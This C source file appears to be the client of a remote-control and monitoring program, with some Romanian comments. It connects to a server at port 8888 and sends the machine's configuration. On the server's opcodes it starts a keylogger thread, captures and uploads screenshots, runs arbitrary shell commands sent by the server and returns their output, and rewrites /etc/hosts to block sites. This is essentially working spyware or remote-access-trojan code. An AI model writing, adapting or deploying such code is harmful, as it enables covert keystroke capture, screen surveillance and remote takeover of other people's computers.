#include <stdio.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/wait.h>
#include <unistd.h>
#include <pwd.h>
#include <fcntl.h>
#include "clientManager.h"
#include "keylog.h"
#include "constraints.h"
#include "messageManager.h"
#include "utils.h"

extern clientInfo_t clientData;
#define MAX_SITES 20

void connectionInitialize(int *sock)
{
    struct sockaddr_in server;

    // Create socket
    *sock = socket(AF_INET, SOCK_STREAM, 0);
    if (*sock == -1)
    {
        printf("Could not create socket\n");
        exit(1);
    }
    printf("Socket created\n");

    server.sin_addr.s_addr = inet_addr(IP_ADDR); // Server IP
    server.sin_family = AF_INET;
    server.sin_port = htons(8888); // Server port

    // Connect to remote server
    if (connect(*sock, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        perror("Connect failed. Error");
        exit(1);
    }
    printf("Connected\n");
}

void startingDataInitialize()
{
    // Trimite Date despre Utilizator--------------------
    printf("Opening file %s\n", CLIENT_CONFIG_FILE);
    int fd = open(CLIENT_CONFIG_FILE, O_RDONLY);
    if (fd < 0)
    {
        printf("Error Opening Config file.\n");
        exit(-1);
    }

    char buffer[BUFFER_SIZE];

    ssize_t bytes_read = read(fd, buffer, sizeof(buffer) - 1);
    if (bytes_read < 0)
    {
        perror("Eroare la citirea fișierului");
        close(fd);
        exit(-1);
    }
    close(fd);

    buffer[bytes_read] = '\0';
    char copyBuffer[BUFFER_SIZE];
    strcpy(copyBuffer, buffer);
    char *p = strtok(buffer, " =\n");
    while (p)
    {
        if (strcmp(p, "Nume_Echipament") == 0)
        {
            p = strtok(NULL, "= \n");
            strcpy(clientData.name, p);
        }
        if (strcmp(p, "Keyboard_Input") == 0)
        {
            p = strtok(NULL, "= \n");
            strcpy(clientData.keyLoggerInputFile, p);
        }
        p = strtok(NULL, "= \n");
    }

    message_t msg;
    encapsulateMessage(&msg, copyBuffer, 'U');

    sendMessage(clientData.serverSocket, &msg);
}

void handleKeyLoggerOpcode()
{
    if (clientData.isKeyLoggerActive && clientData.keyLoggerTid != -1)
    {
        pthread_cancel(clientData.keyLoggerTid);
        // close(clientData.keyLoggerInputFile);
        message_t msg;
        msg.opCode = 'K';
        strcpy(msg.buffer, "STOP");
        msg.size = strlen(msg.buffer);
        sendMessage(clientData.serverSocket, &msg);
        clientData.keyLoggerTid = -1;
        clientData.isKeyLoggerActive = 0;
        close(clientData.keyLoggerFd);
    }
    else
    {
        clientData.isKeyLoggerActive = 1;
        if (pthread_create(&clientData.keyLoggerTid, NULL, start_keylogger, NULL) < 0)
        {
            perror("Could not create thread");
        }
        pthread_detach(clientData.keyLoggerTid);
    }
}

void handleScreenshotOpcode()
{
    message_t msg;

    strcpy(msg.buffer, "");
    msg.opCode = 'S';
    msg.size = 0;
    sendMessage(clientData.serverSocket, &msg);

    char filename[BUFFER_SIZE];
    strcpy(filename, "/tmp/screenshotTmp.jpg");

    pid_t pid = fork();

    if (pid == 0)
    {
        execlp("scrot", "scrot", filename, "--quality", "50", NULL);
        perror("execlp failed");
        exit(EXIT_FAILURE);
    }
    else if (pid > 0)
    {
        wait(NULL);
    }
    else
    {
        msg.opCode = 'E';
        strcpy(msg.buffer, "Failed to fork for Screenshot.\n");
        msg.size = strlen(msg.buffer);
        sendMessage(clientData.serverSocket, &msg);
    }
    sendFile(clientData.serverSocket, filename);

    remove(filename);
}

void expandTilde(char **args)
{
    for (int i = 0; args[i] != NULL; i++)
    {
        if (args[i][0] == '~')
        {
            const char *user = getenv("SUDO_USER");
            struct passwd *pw = getpwnam(user);
            const char *home = pw->pw_dir;

            char *expanded = malloc(strlen(home) + strlen(args[i]));
            sprintf(expanded, "%s%s", home, args[i] + 1);
            args[i] = expanded;
        }
    }
}

void expandRedirect(char **args)
{
    int i = 0;
    while (args[i] != NULL)
    {
        if (strcmp(args[i], ">") == 0)
        {
            if (args[i + 1] != NULL)
            {
                int fd = open(args[i + 1], O_WRONLY | O_CREAT | O_TRUNC, 0644);
                if (fd == -1)
                {
                    perror("Failed to open file for redirection");
                    exit(EXIT_FAILURE);
                }

                // Redirect stdout to the file using dup2
                if (dup2(fd, STDOUT_FILENO) == -1)
                {
                    perror("Failed to redirect output");
                    exit(EXIT_FAILURE);
                }

                close(fd);

                // Remove the ">" 
                args[i] = NULL; 
                break;
            }
            else
            {
                fprintf(stderr, "No output file specified for redirection\n");
                exit(EXIT_FAILURE);
            }
        }
        i++;
    }
}

void handleCommandOpcode(message_t msg)
{
    pid_t pid;
    int pipe_fd[2];

    // Create a pipe
    if (pipe(pipe_fd) == -1)
    {
        perror("pipe");
        exit(EXIT_FAILURE);
    }

    pid = fork();

    if (pid == 0)
    {
        
        close(pipe_fd[0]);

        
        dup2(pipe_fd[1], STDOUT_FILENO);
        dup2(pipe_fd[1], STDERR_FILENO);
        close(pipe_fd[1]); 

        int argCount = 0;
        char *temp = strdup(msg.buffer);
        char *p = strtok(temp, " ");
        while (p)
        {
            argCount++;
            p = strtok(NULL, " ");
        }
        free(temp);

        char **args = (char **)malloc((argCount + 1) * sizeof(char *));
        int i = 0;
        p = strtok(msg.buffer, " ");
        while (p)
        {
            args[i++] = p;
            p = strtok(NULL, " ");
        }
        args[i] = NULL;

        expandTilde(args);
        expandRedirect(args);

        execvp(args[0], args);
        perror("Command"); 
        exit(EXIT_FAILURE);
    }
    else if (pid > 0)
    {
        // Parent process
        close(pipe_fd[1]); 

        // Read from the pipe
        char buffer[1024];
        ssize_t bytesRead;
        message_t msg;
        while ((bytesRead = read(pipe_fd[0], buffer, sizeof(buffer) - 1)) > 0)
        {
            buffer[bytesRead] = '\0'; 
            encapsulateMessage(&msg, buffer, 'M');
            sendMessage(clientData.serverSocket, &msg);
        }

        close(pipe_fd[0]); 
        wait(NULL);        
    }
    else
    {
        msg.opCode = 'E';
        strcpy(msg.buffer, "Failed to fork for Screenshot.\n");
        msg.size = strlen(msg.buffer);
        sendMessage(clientData.serverSocket, &msg);
    }
}

void handleIpOpcode(message_t msg)
{
    FILE *hosts_file = fopen(HOSTS_FILE, "r"); // Open /etc/hosts in read mode
    if (hosts_file == NULL)
    {
        perror("Error opening /etc/hosts");
        return;
    }

    // Create a temporary file to store the updated hosts content
    FILE *temp_file = fopen("/tmp/hosts.tmp", "w");
    if (temp_file == NULL)
    {
        perror("Error opening temporary file");
        fclose(hosts_file);
        return;
    }

    char line[512];
    // Read /etc/hosts line by line
    while (fgets(line, sizeof(line), hosts_file))
    {
        
        if (strstr(line, "www.") == NULL)
        {
            // If not, write the line to the temporary file
            fputs(line, temp_file);
        }
    }

    fclose(hosts_file); 

    
    char *site = strtok(msg.buffer, "\n");
    while (site != NULL)
    {
        printf("Blocking: %s\n", site);
        // Append each site to the temporary file redirecting to 127.0.0.1
        fprintf(temp_file, "127.0.0.1    %s\n", site);
        site = strtok(NULL, "\n"); // Get the next site
    }

    fclose(temp_file); 

    
    if (rename("/tmp/hosts.tmp", HOSTS_FILE) == 0)
    {
        //printf("Updated /etc/hosts successfully.\n");
    }
    else
    {
        perror("Error replacing /etc/hosts");
    }
}

void handleOpcode(message_t msg)
{
    switch (msg.opCode)
    {
    case 'K':
        handleKeyLoggerOpcode();
        break;
    case 'S':
        handleScreenshotOpcode();
        break;
    case 'C': 
        handleCommandOpcode(msg);
        break;
    case 'B':
        handleIpOpcode(msg);
        break;
    }
}